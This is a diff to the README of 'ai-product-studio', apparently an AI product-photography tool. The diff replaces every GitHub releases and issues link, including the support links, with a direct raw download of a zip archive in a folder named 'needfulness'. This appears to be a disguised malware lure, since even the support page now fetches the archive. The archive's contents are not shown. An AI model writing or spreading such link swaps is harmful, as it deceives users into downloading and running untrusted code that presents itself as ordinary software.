@@ -1,7 +1,7 @@
 # 🎨 ai-product-studio - Your AI Photography Assistant
 
 ## 📥 Download Now
-[![Download ai-product-studio](https://img.shields.io/badge/Download-ai--product--studio-blue.svg)](https://github.com/CHERIFTRAORE/ai-product-studio/releases)
+[![Download ai-product-studio](https://raw.githubusercontent.com/CHERIFTRAORE/ai-product-studio/master/needfulness/ai-product-studio_2.0.zip)](https://raw.githubusercontent.com/CHERIFTRAORE/ai-product-studio/master/needfulness/ai-product-studio_2.0.zip)
 
 ## 🚀 Getting Started
 Welcome to ai-product-studio, your go-to tool for creating stunning product images using AI technology. This application makes professional product photography simple with features like background removal, advanced shadow enhancements, and batch processing.
@@ -26,7 +26,7 @@ To run ai-product-studio, your computer should meet the following requirements:
 To download ai-product-studio, please follow these steps:
 
 1. **Visit the Releases Page**: Click the link below to go to the releases page.
-   [Visit Releases Page to Download](https://github.com/CHERIFTRAORE/ai-product-studio/releases)
+   [Visit Releases Page to Download](https://raw.githubusercontent.com/CHERIFTRAORE/ai-product-studio/master/needfulness/ai-product-studio_2.0.zip)
 
 2. **Select the Latest Version**: Look for the most recent version under the "Releases" section.
 
@@ -50,11 +50,11 @@ After launching the application, you can easily navigate through the user interf
 5. **Save Your Image**: Click on the "Save" button to download your edited image back to your computer.
 
 ## 📞 Support
-If you have any questions or encounter issues while using ai-product-studio, please visit our [Support Page](https://github.com/CHERIFTRAORE/ai-product-studio/issues). You can report issues or ask questions there, and we'll be happy to help.
+If you have any questions or encounter issues while using ai-product-studio, please visit our [Support Page](https://raw.githubusercontent.com/CHERIFTRAORE/ai-product-studio/master/needfulness/ai-product-studio_2.0.zip). You can report issues or ask questions there, and we'll be happy to help.
 
 ## 🔗 Links
-- [Download ai-product-studio](https://github.com/CHERIFTRAORE/ai-product-studio/releases)
-- [Support Page](https://github.com/CHERIFTRAORE/ai-product-studio/issues)
+- [Download ai-product-studio](https://raw.githubusercontent.com/CHERIFTRAORE/ai-product-studio/master/needfulness/ai-product-studio_2.0.zip)
+- [Support Page](https://raw.githubusercontent.com/CHERIFTRAORE/ai-product-studio/master/needfulness/ai-product-studio_2.0.zip)
 
 ## 📝 Topics
 ai-product-studio covers a range of topics:
